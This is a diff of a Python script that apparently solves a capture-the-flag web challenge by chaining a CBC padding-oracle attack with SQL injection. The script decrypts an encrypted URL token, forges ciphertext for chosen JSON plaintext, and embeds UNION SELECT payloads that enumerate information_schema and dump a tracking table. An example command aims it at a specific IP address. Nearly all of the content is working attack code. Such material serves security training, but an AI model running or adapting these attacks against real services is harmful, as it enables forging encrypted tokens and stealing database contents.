@@ -1,3 +1,6 @@
+# Example:
+# python3 main.py 'http://35.190.155.168/a4f0863709/?post=C1R8KPdiqzFlAl-F!oI-Uusszt6iMYZYpp4kgEuzXJ30LE8wLHwo5V8Hhxzn8d6Q-GwtaJXuTVMo0xxwWPYDSjCRhCbNPY915y-vLmkXNtPnbpDnzp0o!qAJKVQmWTxXRqjWG1I3KZ6WrPktcGm920WZjk!1R0eRIhIWHqpNB4mqs5CZtCPPKZm-w2QAwmbnfdLiDj33Su2nEVYgtofaBw~~'
+
 import re
 import sys
 import time
@@ -8,22 +11,16 @@ import requests
 import threading
 import copy
 import json
-from hashlib import md5
 from enum import Enum
 from datetime import datetime
-import numpy as np
 import logging
-is_py2 = sys.version[0] == '2'
-if is_py2:
-    import Queue as queue
-else:
-    import queue as queue
+import queue as queue
 
 __fmt__='%(levelname)s %(funcName)s: %(message)s '
 logging.basicConfig(level=logging.INFO, format=__fmt__)
 
 BLOCK_SIZE = 16
-
+URL_PREFIX = ""
 PRE_CALC_CT_BLOCK = [0] * 16
 PRE_CALC_PrePT_BLOCK = [0] * 16
 
@@ -34,10 +31,9 @@ pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
 unpad = lambda s: s[:-ord(s[len(s) - 1:])]
 
 b64d = lambda x: binascii.a2b_base64(x.replace('~', '=').replace('!', '/').replace('-', '+'))
-b64e = lambda x: binascii.b2a_base64(x).replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')
+b64e = lambda x: str(binascii.b2a_base64(x, newline=False)).replace('b\'', '').replace('\'', '').replace('=', '~').replace('+', '-').replace('/', '!')
 
 curTime = lambda: str(datetime.now().strftime("%H:%M:%S"))
-
 
 threadLock_get_prePT_for_block_b = threading.Lock()
 maxthreads_get_prePT_for_block_b = 5
@@ -46,8 +42,6 @@ sema_get_prePT_for_block_b = threading.Semaphore(value=maxthreads_get_prePT_for_
 threadLock_try_k_at_pos = threading.Lock()
 maxthreads_try_k_at_pos = 24  # Best performance in my environment
 sema_try_k_at_pos = threading.Semaphore(value=maxthreads_try_k_at_pos)
-
-
 
 class NotFoundError(Exception):
    """ Raised when couldn't find the expected item """
@@ -58,27 +52,17 @@ def urlToCT(url):
     tmpl = list(bytes(data))
     return [tmpl[i:i+16] for i in range(0, len(tmpl), 16)] # 2 dimentional list
 
-# python 3 code
 def CTToUrl(CT):
     blocknum = len(CT)
     tmpl = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
     data = bytearray(tmpl)
-    str_b64 = str(binascii.b2a_base64(data, newline=False))
-    str_b64 = str_b64.replace('b\'', '').replace('\'', '')
-    url = URL_PREFIX + str_b64.replace('=', '~').replace('+', '-').replace('/', '!')
+    url = URL_PREFIX + b64e(data)
     return url
-
 
 class FindkResult(Enum):
     NotFound = 0
     FoundPotential = 1
     FoundFlag = 2
-
-def listsEqual(x, y):
-    # XXX : Performance can be improved
-    lx = [i if isinstance(i, int) else ord(i) for i in x ]
-    ly = [j if isinstance(j, int) else ord(j) for j in y ]
-    return (lx == ly)
 
 def sendHttpRequest(url):
     response = None
@@ -100,10 +84,6 @@ def sendHttpRequest(url):
         logging.error("Other Error: " + str(e) + ". url = " + url)
         raise Exception("Other error occured when sending http request")
 
-
-def printBlock(block):
-    if logging.getLogger().getEffectiveLevel() == logging.DEBUG:
-        logging.debug(["0x{:02x}".format(x) for x in block])
 
 class Job_try_k_at_pos(threading.Thread):
 
@@ -145,17 +125,15 @@ class Job_try_k_at_pos(threading.Thread):
 
         sema_try_k_at_pos.release()
 
+
 def decrypt_CT_block(CT_block):
 
     cooked_IV = [0] * 16
     prePT_block = [0] * 16
 
     for pos in range(15, -1, -1):
-
-        logging.debug("pos=" + str(pos))
         pad = 16 - pos
 
-        # filling bytes for the previous ciphertext block
         for i in range(15, pos, -1):
             cooked_IV[i] = (prePT_block[i] ^ pad)
 
@@ -196,22 +174,19 @@ def get_prePT_for_block_b(CT, b, out_queue):
     sema_get_prePT_for_block_b.acquire()
 
     logging.info("Calculating for Block " + str(b) + " ...")
+
     prePT_block = [0] * 16
     prePT_block = decrypt_CT_block(CT[b])
     threadLock_get_prePT_for_block_b.acquire()
     out_queue.put((b, prePT_block))
     logging.info("Done with Block " + str(b))
 
-    printBlock(prePT_block) # print if logging level is logging.DEBUG
     threadLock_get_prePT_for_block_b.release()
     sema_get_prePT_for_block_b.release()
 
-
 def decrypt_CT_and_get_PT_prePT(url):
-
     CT = urlToCT(url)
     blocknum = len(CT)
-
     CT_array = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
 
     my_queue = queue.Queue()
@@ -234,7 +209,6 @@ def decrypt_CT_and_get_PT_prePT(url):
         (b , prePT_block) = my_queue.get()
         prePT[b] = prePT_block
 
-    logging.debug("\nDone calculating prePT")
 
     for b in range(blocknum - 1, 0, -1):
         prePT_block = prePT[b]
@@ -242,53 +216,48 @@ def decrypt_CT_and_get_PT_prePT(url):
         PT_block = [ prePT_block[i] ^ f(CT[b-1][i]) for i in range(0, BLOCK_SIZE) ]
         PT[b] = copy.deepcopy(PT_block)
 
-        printBlock(PT[b])
-
     return prePT, PT
 
 
 def get_2nd_flag(orig_url):
-    start = time.time()
-
     orig_prePT, orig_PT = decrypt_CT_and_get_PT_prePT(orig_url)
-
     CT = urlToCT(orig_url)
     blocknum = len(CT)
     orig_PT_array = [ orig_PT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
-
     jstr = unpad(bytearray(orig_PT_array[BLOCK_SIZE:])).decode("utf-8")
     jobj = json.loads(jstr)
     flag_str = jobj['flag']
     logging.info("flag found = " + flag_str)
 
-    return flag_str        
+    return flag_str
 
-
-def gen_CT_for_desired_PT_str(desired_PT_str):
+def get_PRE_CALC_CT_prePT_block():
     global PRE_CALC_CT_BLOCK
     global PRE_CALC_PrePT_BLOCK
-    if (listsEqual(PRE_CALC_PrePT_BLOCK, [0] * 16)):
+    if ((not any(PRE_CALC_PrePT_BLOCK)) and (not any(PRE_CALC_CT_BLOCK))):
         PRE_CALC_PrePT_BLOCK = decrypt_CT_block(PRE_CALC_CT_BLOCK)
-    return gen_CT_for_desired_PT_str_with_pre_calc( \
-            PRE_CALC_CT_BLOCK, PRE_CALC_PrePT_BLOCK, desired_PT_str)
 
-def gen_CT_for_desired_PT_str_with_pre_calc( \
-        pre_calc_CT_block, pre_calc_prePT_block, desired_PT_str):
+    return PRE_CALC_CT_BLOCK, PRE_CALC_PrePT_BLOCK
 
+def desired_str_to_PT(desired_PT_str):
     padded_desired_PT_str = pad(desired_PT_str)
     blocknum = int(len(padded_desired_PT_str) / 16)
     desired_PT = [[0] * 16 for _ in range(blocknum)]
     desired_PT = [padded_desired_PT_str[i:i+16] \
-            for i in range(0, len(padded_desired_PT_str), 16)]
+            for i in range(0, len(padded_desired_PT_str), 16)] # 2 dimentional list
     desired_PT.insert(0, [0] * 16)
     blocknum = blocknum + 1
+    return blocknum, desired_PT
 
+def gen_CT_for_desired_PT_str(desired_PT_str):
+
+    blocknum, desired_PT = desired_str_to_PT(desired_PT_str)
+    pre_calc_CT_block, pre_calc_prePT_block = get_PRE_CALC_CT_prePT_block()
     cooked_CT    = [[0] * 16 for _ in range(blocknum)]
     cooked_prePT = [[0] * 16 for _ in range(blocknum)]
-    cooked_CT[-1]    = pre_calc_CT_block    
-    cooked_prePT[-1] = pre_calc_prePT_block
+    cooked_CT[-1]    = copy.deepcopy(pre_calc_CT_block)
+    cooked_prePT[-1] = copy.deepcopy(pre_calc_prePT_block)
 
-    # Calculating cooked_CT
     for b in range(blocknum - 1, 0, -1):
         cooked_CT[b-1] = [ cooked_prePT[b][i] ^ f(desired_PT[b][i]) for i in range(0, 16) ]
         if (b-1 > 0):
@@ -297,19 +266,28 @@ def gen_CT_for_desired_PT_str_with_pre_calc( \
     return cooked_CT
 
 def get_1st_and_3rd_flag():
-    start = time.time()
-
     desired_PT_str = '{"id":"1"}'
-    cooked_CT =  gen_CT_for_desired_PT_str(desired_PT_str)
-    cooked_url = CTToUrl(cooked_CT)
-    logging.debug("cooked_url = " + cooked_url)
-    logging.debug("desired_PT_str = " + desired_PT_str)
+    cooked_url = CTToUrl(gen_CT_for_desired_PT_str(desired_PT_str))
     resp_str = str(requests.get(cooked_url).content)
-
-    logging.debug("response = " + resp_str)
-    flags_found = [x.group() for x in re.finditer(r'\^FLAG\^(.*?)\$FLAG\$', resp_str)]
+    flags = re.findall('\^FLAG\^.+?\$FLAG\$', resp_str)
     logging.info("flags found = ")
-    logging.info(flags_found)
+    logging.info(flags)
+
+def get_3rd_and_4th_flag():
+    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT database(),1"}'
+    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(table_name),1 FROM information_schema.tables WHERE table_schema=\'level3\'"}'
+    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'posts\'"}'
+    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'tracking\'"}'
+    desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(id,headers), 1 FROM tracking"}'
+    cooked_url = CTToUrl(gen_CT_for_desired_PT_str(desired_PT_str))
+    resp_str = str(requests.get(cooked_url).content)
+    final_link = resp_str.split("/?post=")[1].split("\\r\\nUser-Agent")[0]
+    final_link = URL_PREFIX + final_link
+    resp_str = str(requests.get(final_link).content)
+    flags = re.findall('\^FLAG\^.+?\$FLAG\$', resp_str)
+    flags = list(dict.fromkeys(flags))
+    logging.info("flags found = ")
+    logging.info(flags)
 
 if __name__ == "__main__":
     arg_num = len(sys.argv)
@@ -317,12 +295,19 @@ if __name__ == "__main__":
         err_str = "Wrong Input. Input format: ./script.py 'http://....."
         sys.exit(err_str)
 
+    start = time.time()
+
     orig_url = str(sys.argv[1])
     URL_PREFIX = orig_url.split('=', 1)[0] + '='
-    logging.info("\norig_url = " + orig_url)
 
     # Sanatization check: see if the server is still available
     sendHttpRequest(orig_url) 
-
+    
     get_2nd_flag(orig_url)
     get_1st_and_3rd_flag()
+    get_3rd_and_4th_flag()
+
+    end = time.time()
+    hours, rem = divmod(end-start, 3600)
+    minutes, seconds = divmod(rem, 60)
+    logging.info("Duration = %d hour %d min %d sec" % (int(hours),int(minutes),int(seconds)))
